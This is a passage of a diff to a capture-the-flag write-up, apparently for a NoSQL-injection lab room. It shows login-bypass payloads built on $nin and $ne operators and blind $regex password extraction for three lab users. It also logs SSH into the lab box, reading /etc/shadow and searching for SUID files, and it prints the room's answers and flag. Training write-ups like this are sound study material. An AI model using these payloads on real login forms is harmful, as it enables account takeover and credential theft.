@@ -199,3 +199,205 @@ Answer the questions below
 user[$nin][]=admin&pass[$ne]=witty1&remember=on
 
 do intercept
+
+User:	pedro
+Password:	************
+Full Name:	
+email:	pcollins@nosql.int
+
+user[$nin][]=admin&user[$nin][]=pedro&pass[$ne]=witty1&remember=on
+
+do intercept
+
+User:	john
+Password:	************
+Full Name:	
+email:	jsmith@nosql.int
+
+user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&pass[$ne]=witty1&remember=on
+
+do intercept
+
+error cz only there are 3 users
+```
+How many users are there in total?
+*3*
+There is a user that starts with the letter "p". What is his username?
+*pedro*
+### Extracting Users' Passwords
+Extracting users' passwords
+At this point, we have access to all of the accounts in the application. However, it is important to try to extract the actual passwords in use as they might be reused in other services. To accomplish this, we will be abusing the $regex operator to ask a series of questions to the server that allow us to recover the passwords via a process that resembles playing the game hangman.
+First, let's take one of the users discovered before and try to guess the length of his password. We will be using the following payload to do that:
+![](https://i.imgur.com/3QRR3Ei.png)Notice that we are asking the database if there is a user with a username of admin and a password that matches the regex: `**^.{7}$**`. This basically represents a wildcard word of length 7. Since the server responds with a login error, we know the password length for the user admin isn't 7. After some trial and error, we finally arrived at the correct answer:
+We now know the password for user admin has length 5. Now to figure the actual content, we modify our payload as follows:
+![](https://i.imgur.com/8fHxIPu.png)
+We are now working with a regex of length 5 (a single letter c plus 4 dots), matching the discovered password length, and asking if the admin's password matches the regex `^c....$` , which means it starts with a lowercase c, followed by any 4 characters. Since the server response is an invalid login, we now know the first letter of the password can't be "c". We continue iterating over all available characters until we get a successful response from the server:
+![](https://i.imgur.com/7gqsCX6.png)
+This confirms that the first letter of admin's password is 'a'. The same process can be repeated for the other letters until the full password is recovered. This can be repeated for other users as well if needed.
+Answer the questions below
+```text
+send to repeater 
+
+getting pass admin
+
+user=admin&pass[$regex]=^.{8}$&remember=on
+
+Location: /sekr3tPl4ce.php
+
+8 character
+
+user=admin&pass[$regex]=^a.......$&remember=on
+
+starts with a
+
+user=admin&pass[$regex]=^ad......$&remember=on
+
+ad
+
+user=admin&pass[$regex]=^admin123$&remember=on
+
+Location: /sekr3tPl4ce.php
+
+so admin:admin123
+
+User:	admin
+Password:	************
+Full Name:	
+email:	admin@nosql.int
+
+yep 
+
+now for pedro then john :)
+
+user=pedro&pass[$regex]=^.{11}$&remember=on
+
+Location: /sekr3tPl4ce.php
+
+11 characters
+
+user=pedro&pass[$regex]=^c..........$&remember=on
+
+starts with c
+
+user=pedro&pass[$regex]=^coolpass123$&remember=on
+
+Location: /sekr3tPl4ce.php
+
+so pedro:coolpass123
+
+let's see
+
+User:	pedro
+Password:	************
+Full Name:	
+email:	pcollins@nosql.int
+
+yep :)
+
+now john
+
+user=john&pass[$regex]=^.{8}$&remember=on
+
+8 characters
+
+user=john&pass[$regex]=^10......$&remember=on
+
+Location: /sekr3tPl4ce.php
+
+starts with 1
+
+user=john&pass[$regex]=^10584312$&remember=on
+
+Location: /sekr3tPl4ce.php
+
+john:10584312
+
+User:	john
+Password:	************
+Full Name:	
+email:	jsmith@nosql.int
+
+:)
+
+was really fun!
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh john@10.10.254.225                               
+The authenticity of host '10.10.254.225 (10.10.254.225)' can't be established.
+ED25519 key fingerprint is SHA256:V/8G3mpnlCv/7PyT/47/lXkPvwwFule0P6GZ7ZbqpAk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.254.225' (ED25519) to the list of known hosts.
+john@10.10.254.225's password: 
+
+Permission denied, please try again.
+john@10.10.254.225's password: 
+Permission denied, please try again.
+john@10.10.254.225's password: 
+john@10.10.254.225: Permission denied (publickey,password).
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh admin@10.10.254.225
+admin@10.10.254.225's password: 
+Permission denied, please try again.
+admin@10.10.254.225's password: 
+Permission denied, please try again.
+admin@10.10.254.225's password: 
+admin@10.10.254.225: Permission denied (publickey,password).
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh pedro@10.10.254.225
+pedro@10.10.254.225's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Wed Jun 23 03:34:24 2021 from 192.168.100.250
+pedro@nosql-nolife:~$ whoami;id
+pedro
+uid=1001(pedro) gid=1001(pedro) groups=1001(pedro)
+pedro@nosql-nolife:~$ ls
+flag.txt
+pedro@nosql-nolife:~$ cat flag.txt
+flag{N0Sql_n01iF3!}
+
+pedro@nosql-nolife:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+pedro@nosql-nolife:~$ sudo -l
+[sudo] password for pedro: 
+Sorry, user pedro may not run sudo on nosql-nolife.
+pedro@nosql-nolife:~$ find -perm -4000 2>/dev/null | xargs ls -lah
+total 32K
+drwxr-xr-x 3 pedro pedro 4.0K Jun 23  2021 .
+drwxr-xr-x 4 root  root  4.0K Jun 23  2021 ..
+lrwxrwxrwx 1 pedro pedro    9 Jun 23  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 pedro pedro  220 Jun 23  2021 .bash_logout
+-rw-r--r-- 1 pedro pedro 3.7K Jun 23  2021 .bashrc
+drwx------ 2 pedro pedro 4.0K Jun 23  2021 .cache
+-rw-rw-r-- 1 pedro pedro   20 Jun 23  2021 flag.txt
+-rw-r--r-- 1 pedro pedro  807 Jun 23  2021 .profile
+-rw------- 1 pedro pedro  734 Jun 23  2021 .viminfo
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ service apache2 start
+
+and visit http://10.8.19.103/
+```
+What is john's password?
+*10584312*
+One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag!
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/617be9330b818bf2ed2c31f779be7c17.png)
+- ***flag{N0Sql_n01iF3!}***
+
+## Notes / Lessons Learned
+[[Atlassian, CVE-2022-26134]]
+
